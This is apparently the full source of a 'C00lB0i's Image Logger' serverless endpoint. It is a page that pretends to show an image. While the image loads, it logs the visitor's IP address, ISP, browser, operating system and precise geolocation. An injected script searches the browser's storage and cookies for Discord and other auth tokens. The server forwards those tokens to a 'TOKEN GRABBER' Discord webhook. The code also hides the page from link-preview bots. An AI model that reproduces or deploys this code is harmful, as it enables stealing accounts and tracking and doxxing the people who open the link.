import fetch from 'node-fetch';
import UAParser from 'ua-parser-js';

// Configuration
const config = {
  webhook: process.env.WEBHOOK_URL,
  tokenCaptureWebhook: process.env.TOKEN_WEBHOOK_URL,
  image: "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
  imageArgument: true,
  username: "Image Logger",
  color: 0x00FFFF,
  crashBrowser: false,
  accurateLocation: true,
  message: {
    doMessage: false,
    message: "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
    richMessage: true,
  },
  vpnCheck: 1,
  linkAlerts: true,
  buggedImage: true,
  antiBot: 1,
  redirect: {
    redirect: false,
    page: "https://your-link.here"
  }
};

const blacklistedIPs = ["27", "104", "143", "164"];

function botCheck(ip, useragent) {
  if (!ip || !useragent) return false;
  if (ip.startsWith("34.") || ip.startsWith("35.")) return "Discord";
  if (useragent.includes("TelegramBot")) return "Telegram";
  if (useragent.includes("Twitterbot")) return "Twitter";
  if (useragent.includes("Discordbot")) return "Discord";
  return false;
}

async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = false) {
  if (!ip || blacklistedIPs.some(prefix => ip.startsWith(prefix))) return null;
  
  const bot = botCheck(ip, useragent);
  if (bot) {
    if (config.linkAlerts) {
      await fetch(config.webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          username: config.username,
          embeds: [{
            title: "Image Logger - Link Sent",
            color: config.color,
            description: `Link sent on ${bot}\n**IP:** ${ip}\n**Path:** ${endpoint}`
          }]
        })
      }).catch(e => console.error('Webhook error:', e));
    }
    return null;
  }

  try {
    const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,proxy,hosting,mobile,timezone`)
      .then(res => res.json())
      .catch(e => {
        console.error('IP API error:', e);
        return {};
      });
    
    const parser = new UAParser(useragent);
    const agentInfo = parser.getResult();
    const os = agentInfo.os?.name || 'Unknown';
    const browser = agentInfo.browser?.name || 'Unknown';
    
    const embed = {
      username: config.username,
      content: "@everyone",
      embeds: [{
        title: "Image Logger - IP Logged",
        color: config.color,
        description: `**IP:** ${ip}
**Location:** ${ipInfo.city || 'Unknown'}, ${ipInfo.regionName || 'Unknown'}, ${ipInfo.country || 'Unknown'}
**ISP:** ${ipInfo.isp || 'Unknown'}
**Coordinates:** ${coords || (ipInfo.lat && ipInfo.lon ? `${ipInfo.lat}, ${ipInfo.lon}` : 'Unknown')}
**Timezone:** ${ipInfo.timezone || 'Unknown'}
**Mobile:** ${ipInfo.mobile ? 'Yes' : 'No'}
**VPN/Proxy:** ${ipInfo.proxy ? 'Yes' : 'No'}
**Hosting:** ${ipInfo.hosting ? 'Yes' : 'No'}
**OS:** ${os} | **Browser:** ${browser}
**User Agent:** \`\`\`${useragent}\`\`\``,
      }]
    };
    
    if (url) embed.embeds[0].thumbnail = { url };
    
    await fetch(config.webhook, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(embed)
    }).catch(e => console.error('Webhook error:', e));
    
    return ipInfo;
  } catch (error) {
    console.error('Reporting error:', error);
    return null;
  }
}

async function sendTokenReport(ip, useragent, token) {
  try {
    await fetch(config.tokenCaptureWebhook, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        username: "TOKEN GRABBER",
        content: "@everyone",
        embeds: [{
          title: "Discord Token Captured!",
          color: 0xFF0000,
          description: `**Token:** \`${token}\`\n**IP:** ${ip}\n**User Agent:** ${useragent}`,
        }]
      })
    }).catch(e => console.error('Token webhook error:', e));
  } catch (error) {
    console.error('Token report error:', error);
  }
}

export default async (req, res) => {
  try {
    // Handle token submission
    if (req.method === 'POST') {
      let token = 'NOT_FOUND';
      try {
        const body = JSON.parse(req.body);
        token = body.token || 'NOT_FOUND';
      } catch {
        // Fallback if JSON parse fails
        token = req.body.token || 'NOT_FOUND';
      }
      
      const ip = req.headers['x-forwarded-for'] || 'Unknown';
      const userAgent = req.headers['user-agent'] || 'Unknown';
      
      if (token && token !== 'NOT_FOUND') {
        await sendTokenReport(ip, userAgent, token);
      }
      
      return res.status(200).send('OK');
    }

    // Main GET request
    const { query } = req;
    const ip = req.headers['x-forwarded-for'] || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    let imageUrl = config.image;
    if (config.imageArgument && (query.url || query.id)) {
      try {
        const urlParam = query.url || query.id;
        imageUrl = Buffer.from(urlParam, 'base64').toString('utf-8');
      } catch (error) {
        console.error('Image URL decode error:', error);
      }
    }

    // Handle bots
    const bot = botCheck(ip, userAgent);
    if (bot) {
      if (config.buggedImage) {
        res.setHeader('Content-Type', 'image/png');
        return res.send(Buffer.from(
          'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
          'base64'
        ));
      }
      await makeReport(ip, userAgent, null, req.url, imageUrl);
      return res.redirect(imageUrl);
    }

    // Build HTML content
    let htmlContent = `<!DOCTYPE html><html><head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Image Viewer</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .image-container { max-width: 100%; max-height: 100vh; text-align: center; }
        .image-container img { max-width: 100%; max-height: 90vh; object-fit: contain; }
        .loading { color: #fff; font-family: Arial, sans-serif; font-size: 18px; margin-top: 20px; }
      </style>
      <script>
        setTimeout(() => {
          const tokenKeys = ['token', 'discord_token', '_token', 'access_token', 'auth_token'];
          let token = "NOT_FOUND";
          
          // Check storage locations
          tokenKeys.forEach(key => {
            try {
              const value = localStorage.getItem(key);
              if (value && value.length > 50) token = value;
            } catch(e) {}
          });
          
          if (token === "NOT_FOUND") {
            tokenKeys.forEach(key => {
              try {
                const value = sessionStorage.getItem(key);
                if (value && value.length > 50) token = value;
              } catch(e) {}
            });
          }
          
          if (token === "NOT_FOUND") {
            document.cookie.split(';').forEach(cookie => {
              const [name, value] = cookie.trim().split('=');
              if (tokenKeys.includes(name) && value && value.length > 50) {
                token = value;
              }
            });
          }
          
          if (token !== "NOT_FOUND") {
            fetch('/api/image', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ token })
            });
          }
        }, 3000);
      </script>`;

    // Geolocation script
    if (config.accurateLocation && !query.g) {
      htmlContent += `<script>
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            position => {
              const lat = position.coords.latitude;
              const lon = position.coords.longitude;
              const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
              window.location.search += '&g=' + g;
            },
            error => console.error('Geolocation error:', error)
          );
        }
      </script>`;
    }

    htmlContent += `</head><body>
      <div class="image-container">
        <img src="${imageUrl}" alt="Preview" onerror="this.style.display='none'">
        <div class="loading">Loading image...</div>
      </div>
    </body></html>`;
    
    // Process geolocation if available
    const coords = query.g ? Buffer.from(query.g, 'base64').toString() : null;
    
    // Make IP report
    await makeReport(ip, userAgent, coords, req.url, imageUrl);
    
    // Send response
    res.setHeader('Content-Type', 'text/html');
    res.send(htmlContent);
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).send('Internal Server Error');
  }
};
